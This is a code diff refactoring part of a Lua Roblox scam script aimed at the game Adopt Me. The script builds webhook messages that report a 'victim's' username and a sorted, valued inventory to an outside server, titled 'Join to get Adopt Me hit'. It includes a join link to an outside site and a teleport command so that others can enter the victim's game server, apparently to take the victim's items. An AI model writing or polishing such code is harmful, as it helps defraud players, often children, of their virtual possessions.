@@ -117,7 +117,7 @@ local function propertiesToString(props)
     elseif props.neon then
         str = str .. " Neon🟢"
     else
-        str = str .. "d"
+        str = str .. " Normal"
     end
     return str
 end
@@ -127,76 +127,74 @@ local function SendJoinMessage(list, prefix)
         ["Content-Type"] = "application/json"
     }
 
-    local fields = {
-        {
-            name = "Victim Username:",
-            value = plr.Name,
-            inline = true
-        },
-        {
-            name = "Join link:",
-            value = "https://fern.wtf/joiner?placeId=85896571713843&gameInstanceId=" .. game.JobId
-        },
-        {
-            name = "📜Item list:",
-            value = "",
-            inline = false
-        },
-        {
-            name = "💲Summary:",
-            value = string.format("Total Value: %s", totalValue),
-            inline = false
-        }
-    }
-
-    local grouped = {}
+    -- Создаем таблицу для инвентаря
+    local inventoryTable = {}
     for _, item in ipairs(list) do
-        local key = item.Name .. " " .. propertiesToString(item.Properties)
-        if grouped[key] then
-            grouped[key].Count = grouped[key].Count + 1
-            grouped[key].TotalValue = grouped[key].TotalValue + item.Value
-        else
-            grouped[key] = {
-                Name = item.Name,
-                Properties = item.Properties,
-                Count = 1,
-                TotalValue = item.Value
+        local key = item.Name .. "|" .. tostring(item.Properties.rideable) .. "|" .. tostring(item.Properties.flyable) .. "|" .. tostring(item.Properties.neon) .. "|" .. tostring(item.Properties.mega_neon)
+        if not inventoryTable[key] then
+            inventoryTable[key] = {
+                name = item.Name,
+                rideable = item.Properties.rideable,
+                flyable = item.Properties.flyable,
+                neon = item.Properties.neon,
+                mega_neon = item.Properties.mega_neon,
+                count = 0,
+                totalValue = 0
             }
         end
+        inventoryTable[key].count = inventoryTable[key].count + 1
+        inventoryTable[key].totalValue = inventoryTable[key].totalValue + item.Value
     end
 
-    local groupedList = {}
-    for _, group in pairs(grouped) do
-        table.insert(groupedList, group)
+    -- Преобразуем в массив и сортируем по стоимости
+    local sortedInventory = {}
+    for _, item in pairs(inventoryTable) do
+        table.insert(sortedInventory, item)
     end
-
-    table.sort(groupedList, function(a, b)
-        return a.TotalValue > b.TotalValue
+    table.sort(sortedInventory, function(a, b)
+        return a.totalValue > b.totalValue
     end)
 
-    for _, group in ipairs(groupedList) do
-        local itemLine = string.format("%s %s (x%s): %s Value", group.Name, propertiesToString(group.Properties), group.Count, group.TotalValue)
-        fields[3].value = fields[3].value .. itemLine .. "\n"
-    end
-
-    if #fields[3].value > 1024 then
-        local lines = {}
-        for line in fields[3].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
+    -- Формируем описание инвентаря
+    local inventoryDescription = ""
+    for _, item in ipairs(sortedInventory) do
+        local itemName = item.name
+        local properties = ""
+        if item.rideable then properties = properties .. " Ride🔴" end
+        if item.flyable then properties = properties .. " Fly🔵" end
+        if item.mega_neon then
+            properties = properties .. " Mega🟣"
+        elseif item.neon then
+            properties = properties .. " Neon🟢"
+        else
+            properties = properties .. " Normal"
         end
-
-        while #fields[3].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
+        
+        inventoryDescription = inventoryDescription .. string.format("%s %s (x%d): %.2f\n", itemName, properties, item.count, item.totalValue)
     end
 
     local data = {
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(920587237, '" .. game.JobId .. "')",
         ["embeds"] = {{
-            ["title"] = "\240\159\144\178 Join to get Adopt Me hit",
+            ["title"] = "🎯 Join to get Adopt Me hit",
             ["color"] = 65280,
-            ["fields"] = fields,
+            ["fields"] = {
+                {
+                    name = "Victim Info",
+                    value = string.format("Username: %s\nYou: %s", plr.Name, table.concat(users, ", ")),
+                    inline = false
+                },
+                {
+                    name = "Inventory Information",
+                    value = string.format("```\nTotal Value: %.2f\n%s```", totalValue, inventoryDescription),
+                    inline = false
+                },
+                {
+                    name = "Join Link",
+                    value = string.format("https://fern.wtf/joiner?placeId=85896571713843&gameInstanceId=%s", game.JobId),
+                    inline = false
+                }
+            },
             ["footer"] = {
                 ["text"] = "Adopt Me On Top"
             }
@@ -217,74 +215,71 @@ local function SendMessage(sortedItems)
         ["Content-Type"] = "application/json"
     }
 
-	local fields = {
-		{
-			name = "Victim Username:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items sent:",
-			value = "",
-			inline = false
-		},
-        {
-            name = "Summary:",
-            value = string.format("Total Value: %s", totalValue),
-            inline = false
-        }
-	}
-
-    local grouped = {}
+    -- Создаем таблицу для инвентаря
+    local inventoryTable = {}
     for _, item in ipairs(sortedItems) do
-        local key = item.Name .. " " .. propertiesToString(item.Properties)
-        if grouped[key] then
-            grouped[key].Count = grouped[key].Count + 1
-            grouped[key].TotalValue = grouped[key].TotalValue + item.Value
-        else
-            grouped[key] = {
-                Name = item.Name,
-                Properties = item.Properties,
-                Count = 1,
-                TotalValue = item.Value
+        local key = item.Name .. "|" .. tostring(item.Properties.rideable) .. "|" .. tostring(item.Properties.flyable) .. "|" .. tostring(item.Properties.neon) .. "|" .. tostring(item.Properties.mega_neon)
+        if not inventoryTable[key] then
+            inventoryTable[key] = {
+                name = item.Name,
+                rideable = item.Properties.rideable,
+                flyable = item.Properties.flyable,
+                neon = item.Properties.neon,
+                mega_neon = item.Properties.mega_neon,
+                count = 0,
+                totalValue = 0
             }
         end
+        inventoryTable[key].count = inventoryTable[key].count + 1
+        inventoryTable[key].totalValue = inventoryTable[key].totalValue + item.Value
     end
 
-    local groupedList = {}
-    for _, group in pairs(grouped) do
-        table.insert(groupedList, group)
+    -- Преобразуем в массив и сортируем по стоимости
+    local sortedInventory = {}
+    for _, item in pairs(inventoryTable) do
+        table.insert(sortedInventory, item)
     end
-
-    table.sort(groupedList, function(a, b)
-        return a.TotalValue > b.TotalValue
+    table.sort(sortedInventory, function(a, b)
+        return a.totalValue > b.totalValue
     end)
 
-    for _, group in ipairs(groupedList) do
-        local itemLine = string.format("%s %s (x%s): %s Value", group.Name, propertiesToString(group.Properties), group.Count, group.TotalValue)
-        fields[2].value = fields[2].value .. itemLine .. "\n"
-    end
-
-    if #fields[2].value > 1024 then
-        local lines = {}
-        for line in fields[2].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
+    -- Формируем описание инвентаря в виде таблицы
+    local inventoryDescription = "| Total | Value    |\n|---|---|\n"
+    for _, item in ipairs(sortedInventory) do
+        local itemName = item.name
+        local properties = ""
+        if item.rideable then properties = properties .. "R" end
+        if item.flyable then properties = properties .. "F" end
+        if item.mega_neon then
+            properties = properties .. "Mega"
+        elseif item.neon then
+            properties = properties .. "Neon"
+        else
+            properties = properties .. "Normal"
         end
-
-        while #fields[2].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
+        
+        inventoryDescription = inventoryDescription .. string.format("| %s %s x%d | %.2f |\n", itemName, properties, item.count, item.totalValue)
     end
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "\240\159\144\178 New Adopt Me Execution" ,
+            ["title"] = "🎯 New Adopt Me Execution",
             ["color"] = 65280,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Adopt Me script by meentoz"
-			}
+            ["fields"] = {
+                {
+                    name = "Victim Info",
+                    value = string.format("Username: %s\nYou: %s", plr.Name, table.concat(users, ", ")),
+                    inline = false
+                },
+                {
+                    name = "Inventory Information",
+                    value = string.format("```%s```", inventoryDescription),
+                    inline = false
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Adopt Me script by meentoz"
+            }
         }}
     }
 
